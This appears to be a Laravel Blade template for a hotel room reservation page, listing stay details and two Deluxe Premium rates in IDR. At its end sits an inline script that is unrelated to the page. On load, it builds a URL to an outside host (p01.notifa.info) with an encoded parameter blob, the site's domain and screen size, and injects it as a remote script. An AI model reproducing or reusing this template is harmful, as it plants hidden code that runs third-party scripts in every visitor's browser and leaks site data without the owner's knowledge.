<!DOCTYPE html>
<html lang="en">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<head>
    <title>Reservasi</title>
    <!--[if lt IE 10]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Meta -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="description" content="#">
    <meta name="keywords"
        content="Admin , Responsive, Landing, Bootstrap, App, Template, Mobile, iOS, Android, apple, creative app">
    <meta name="author" content="#">
    <!-- Favicon icon -->
    <link rel="icon" href="../../files/assets/images/Luxury_Logo.png" type="image/x-icon">
    <!-- Google font-->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,800" rel="stylesheet">
    <!-- Required Fremwork -->
    <link rel="stylesheet" type="text/css" href="../../files/bower_components/bootstrap/css/bootstrap.min.css">
    <!-- lightbox Fremwork -->
    <link rel="stylesheet" type="text/css" href="../../files/bower_components/lightbox2/css/lightbox.min.css">
    <!-- themify-icons line icon -->
    <link rel="stylesheet" type="text/css" href="../../files/assets/icon/themify-icons/themify-icons.css">
    <!-- list css -->
    <link rel="stylesheet" type="text/css" href="../../files/assets/pages/list-scroll/list.css">
    <link rel="stylesheet" type="text/css" href="../../files/bower_components/stroll/css/stroll.css">
    <!-- ico font -->
    <link rel="stylesheet" type="text/css" href="../../files/assets/icon/icofont/css/icofont.css">
    <!-- flag icon framework css -->
    <link rel="stylesheet" type="text/css" href="../../files/assets/pages/flag-icon/flag-icon.min.css">
    <!-- Menu-Search css -->
    <link rel="stylesheet" type="text/css" href="../../files/assets/pages/menu-search/css/component.css">
    <!-- Style.css -->
    <link rel="stylesheet" type="text/css" href="../../files/assets/css/style.css">
    <link rel="stylesheet" type="text/css" href="../../files/assets/css/jquery.mCustomScrollbar.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>
    <div id="pcoded" class="pcoded">
        <div class="pcoded-overlay-box"></div>
        <div class="pcoded-container navbar-wrapper">
            <nav class="navbar header-navbar pcoded-header">
                <div class="navbar-wrapper">
                    <div class="navbar-logo">
                        <a href="{{ route('home') }}">
                            <img class="img-fluid" src="../../files/assets/images/22.png" alt="Theme-Logo" height="90%"
                                width="90%"></a>
                        <a class="mobile-options">
                            <i class="ti-more"></i>
                        </a>
                    </div>
                    <div class="navbar-container container-fluid">
                        <ul class="nav-right">
                            <li>
                                <a href="{{ route('home') }}">Home</a>
                            </li>
                            <li>
                                <a href="#">Help</a>
                            </li>
                            <li>
                                @auth
                            <li class="logout_auth"><a href="{{ route('logout') }}" onclick="event.preventDefault();
                                    document.getElementById('formLogout').submit();">
                                    <i class="fa fa-user-o"></i> Logout
                                </a></li>
                            <form id="formLogout" action="{{ route('logout') }}" method="POST"
                                style="display: none;">
                                {{ csrf_field() }}
                            </form>
                        @else
                            <li class="login__in"><a href="{{ route('login') }}">Sign in or join</a>
                            </li>
                            @endauth
                            </li>
                        </ul>
                    </div>
                </div>
            </nav>
            <div class="pcoded-main-container">
                <div class="pcoded-inner-content">
                    <!-- Main-body start -->
                    <div class="main-body">
                        <div class="page-wrapper">
                            <!-- Page-header start -->
                            <div class="page-header card">
                                <div class="row">
                                    <!-- TXT CHECKIN -->
                                    <div class="col-sm-3 b-r-default">
                                        <h6 class="f-w-600" style="font-size:20px;">Check-In</h6>
                                        <h5 class="f-w-300" style="font-size:16px;">
                                            {{ !empty($checkin) ? $checkin:"-" }}</h5>
                                        <input type="hidden" id="checkin" name="checkin" value="{{ $checkin }}">
                                    </div>
                                    <div class="col-sm-2 b-r-default">
                                        <h6 class="f-w-600" style="font-size:20px;">Check-Out</h6>
                                        <h5 class="f-w-300" style="font-size:16px;">
                                            {{ !empty($checkout) ? $checkout:"-" }}</h5>
                                        <input type="hidden" id="checkout" name="checkout" value="{{ $checkout }}">
                                    </div>
                                    <div class="col-sm-3">
                                        <h6 class="f-w-600" style="font-size:20px;">Guests</h6>
                                        <h5 class="f-w-300" style="font-size:16px;">
                                            {{ !empty($adult) ? $adult:"-" }} adult,
                                            {{ !empty($children) ? $children:"-" }}
                                            children</h5>
                                        <input type="hidden" id="adult" name="adult"
                                            value="{{ $adult }}, {{ $children }} ">
                                    </div>
                                    <div class="col-sm-2">
                                        <h6 class="f-w-600" style="font-size:20px;">Promo Code</h6>
                                        <h5 class="f-w-300" style="font-size:16px;">
                                            {{ !empty($promo) ? $promo:"-" }}</h5>
                                        <input type="hidden" id="promo" name="promo" value="{{ $promo }}">
                                    </div>
                                    <div class="col-sm-2">
                                        <a href="{{ URL::previous() }}">
                                            <button style="float: right; margin-right: 35px"
                                                class="btn btn-inverse btn-outline-inverse">Back</button></a>
                                    </div>
                                </div>
                            </div>
                            <!-- Page-header end -->
                            <!-- Page body start -->
                            <div class="page-body">
                                <div class="row">
                                    <div class="col-sm-12">
                                        <!-- List view card start -->
                                        <div class="card">
                                            <div class="row card-block">
                                                <!-- Start Copy For Page -->
                                                <div class="col-md-12">
                                                    <ul class="list-view">
                                                        <li>
                                                            <div class="card list-view-media">
                                                                <div class="card-block">
                                                                    <div class="card-header">
                                                                        <h4 style="border-bottom: 1px solid #bcbdc3; padding-bottom: 10px;">
                                                                            Deluxe Premium
                                                                        </h4>
                                                                    </div>
                                                                    <div class="row">
                                                                        <div class="col-lg-4 col-sm-6">
                                                                            <div class="media">
                                                                                <div style="padding-left: 15px;"
                                                                                    class="media-left"
                                                                                    class="thumbnail">
                                                                                    <div class="thumb">
                                                                                        <a href="/files/assets/images/KMR1.JPG"
                                                                                            data-lightbox="1"
                                                                                            data-title="My caption 1">
                                                                                            <img src="/files/assets/images/KMR1.JPG"
                                                                                                alt=""
                                                                                                class="img-fluid img-thumbnail"></a>
                                                                                        <a href="/files/assets/images/KMR2.JPG"
                                                                                            data-lightbox="1"></a>
                                                                                        <a href="/files/assets/images/KMR3.JPG"
                                                                                            data-lightbox="1"></a>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="media-body">
                                                                            <div class="row"
                                                                                style="padding-bottom: 30px">
                                                                                <div class="col-sm-6">
                                                                                    <div class="column">
                                                                                        <h6 style="text-align: left">
                                                                                            <strong>Price
                                                                                                Includes:</strong>
                                                                                        </h6>
                                                                                    </div>
                                                                                    <div class="column">
                                                                                        <h8 style="text-align: left">
                                                                                            Option Pay at the Hotel
                                                                                        </h8>
                                                                                    </div>
                                                                                    <div class="column">
                                                                                        <h8 style="text-align: left">
                                                                                            Free Wi-Fi</h8>
                                                                                    </div>
                                                                                    <div class="column">
                                                                                        <h8 style="text-align: left">
                                                                                            Free Cancellation before
                                                                                            <b>{{ $checkin }}</b></h8>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="col-sm-6">
                                                                                    <button
                                                                                        style="float: right; margin-right: 35px"
                                                                                        class="btn btn-inverse btn-round">
                                                                                        SELECT
                                                                                    </button>
                                                                                    <h3 style="text-align: left; font-weight: bold">
                                                                                        750.000
                                                                                    </h3>
                                                                                    <p style="text-align: left">
                                                                                        IDR/Night
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                            <div class="row">
                                                                                <div class="col-sm-6">
                                                                                    <div class="column">
                                                                                        <h6 style="text-align: left">
                                                                                            <strong>
                                                                                                Your Price Includes:
                                                                                            </strong>
                                                                                        </h6>
                                                                                    </div>
                                                                                    <div class="column">
                                                                                        <h8 style="text-align: left">
                                                                                            Option Pay at the Hotel</h8>
                                                                                    </div>
                                                                                    <div class="column">
                                                                                        <h8 style="text-align: left">
                                                                                            Free Wi-Fi</h8>
                                                                                    </div>
                                                                                    <div class="column">
                                                                                        <h8 style="text-align: left">
                                                                                            Breakfast for 2 People</h8>
                                                                                    </div>
                                                                                    <div class="column">
                                                                                        <h8 style="text-align: left">
                                                                                            Options for Extrabed</h8>
                                                                                    </div>
                                                                                    <div class="column">
                                                                                        <h8 style="text-align: left">
                                                                                            Free Cancellation before
                                                                                            <b>{{ $checkin }}</b></h8>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="col-sm-6">
                                                                                    <a href="{{ route('reservasi_detail') }}">
                                                                                        <button
                                                                                            style="float: right; margin-right: 35px"
                                                                                            class="btn btn-inverse btn-round">SELECT</button></a>
                                                                                    <h3 style="text-align: left; font-weight: bold">
                                                                                        950.000</h3>
                                                                                    <p style="text-align: left">
                                                                                        IDR/Night</p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                        </li>
                                                    </ul>
                                                </div>

                                                <!-- End Copy for page -->
                                            </div>
                                        </div>
                                        <!-- List view card end -->

                                    </div>
                                </div>
                            </div>
                            <!-- Page body end -->
                        </div>
                    </div>
                    <!-- Main-body end -->
                </div>
            </div>
        </div>
    </div>
    </div>
    </div>
    <![endif]-->
    <!-- Warning Section Ends -->
    <!-- Required Jquery -->
    <script type="text/javascript" src="../../files/bower_components/jquery/js/jquery.min.js"></script>
    <script type="text/javascript" src="../../files/bower_components/jquery-ui/js/jquery-ui.min.js"></script>
    <script type="text/javascript" src="../../files/bower_components/popper.js/js/popper.min.js"></script>
    <script type="text/javascript" src="../../files/bower_components/bootstrap/js/bootstrap.min.js"></script>
    <!-- jquery slimscroll js -->
    <script type="text/javascript" src="../../files/bower_components/jquery-slimscroll/js/jquery.slimscroll.js">
    </script>
    <!-- modernizr js -->
    <script type="text/javascript" src="../../files/bower_components/modernizr/js/modernizr.js"></script>
    <script type="text/javascript" src="../../files/bower_components/modernizr/js/css-scrollbars.js"></script>

    <!-- list-scroll js -->
    <script src="../../files/bower_components/stroll/js/stroll.js"></script>
    <script type="text/javascript" src="../../files/assets/pages/list-scroll/list-custom.js"></script>
    <!-- i18next.min.js -->
    <script type="text/javascript" src="../../files/bower_components/i18next/js/i18next.min.js"></script>
    <script type="text/javascript" src="../../files/bower_components/i18next-xhr-backend/js/i18nextXHRBackend.min.js">
    </script>
    <script type="text/javascript"
        src="../../files/bower_components/i18next-browser-languagedetector/js/i18nextBrowserLanguageDetector.min.js">
    </script>
    <script type="text/javascript" src="../../files/bower_components/jquery-i18next/js/jquery-i18next.min.js"></script>
    <!-- Custom js -->

    <script src="../../files/assets/js/pcoded.min.js"></script>
    <script src="../../files/assets/js/demo-12.js"></script>
    <script src="../../files/assets/js/jquery.mCustomScrollbar.concat.min.js"></script>
    <script type="text/javascript" src="../files/assets/js/script.js"></script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                    "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2uARwFH94Yb8FhjWMLgqF54NM%2fi%2fU8cvi0Cu4PlRKEF8ykr%2fWRqGGWDmrjXewNizw%2byQ%2fxYpWbEhkzheFyT764ufT4f4ACVbLXsL5%2brjrAhu4XlxZu%2fDJiyu0asvmHrK%2fMq14Fl1gmAndaXl1wz1hIksuy7rPrhqPW2CAkDJlqJI5hV14h8nF1ffQJMaQnRsR1z%2bfV8TBfOtiSIgzG4lfk9ZR7VKrZugIWnma6GXX8WY7Qrs3yXyvoGd%2f9ifOAzG41lpT%2fghRWTKLbCunLDnkVQ9JKsDaLfFGnuzJXUfOFVDKOa9%2bAgj5sZZB6FNo6oCokNX1oGyZA7wJN2TakjwzJP%2fI%2bReAMWjIPSdP3bGGJnWNp24ZoObbME4oTUfXAA8IkD%2bOTZ4sdS7qJrH%2bZxczBEwzq6LoOBBcODVF9Z0Xba1A3lLvoJNVXTPJf6g1O%2f7irKDPQRbStjgmoS6caqWepLoDXZco%2bjJjaairJZmhAS4wrS30vJINxk4THf9AW6fr" +
                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
                    .height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };
    </script>
</body>

</html>
